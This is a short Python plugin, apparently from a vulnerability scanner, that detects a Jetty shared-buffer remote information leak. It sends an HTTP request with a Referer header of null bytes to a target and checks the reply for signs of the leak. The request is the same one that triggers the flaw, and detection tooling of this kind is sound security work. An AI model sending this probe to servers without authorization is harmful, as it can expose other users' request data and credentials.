# coding=utf-8
import socket


def get_plugin_info():
    plugin_info = {
        "name": "Jetty 共享缓存区远程泄露",
        "info": "攻击者可利用此漏洞获取其他用户的请求信息，进而获取其权限",
        "level": "中危",
        "type": "信息泄露",
        "author": "wolf@YSRC",
        "url": "https://www.secpulse.com/archives/4911.html",
        "keyword": "tag:jetty",
        "source": 1
    }
    return plugin_info


def check(ip, port, timeout):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, int(port)))
        flag = "GET / HTTP/1.1\r\nReferer:%s\r\n\r\n" % (chr(0) * 15)
        s.send(flag)
        data = s.recv(512)
        s.close()
        if 'state=HEADER_VALUE' in data and '400' in data:
            return u"jetty 共享缓存区远程泄露漏洞"
    except:
        pass
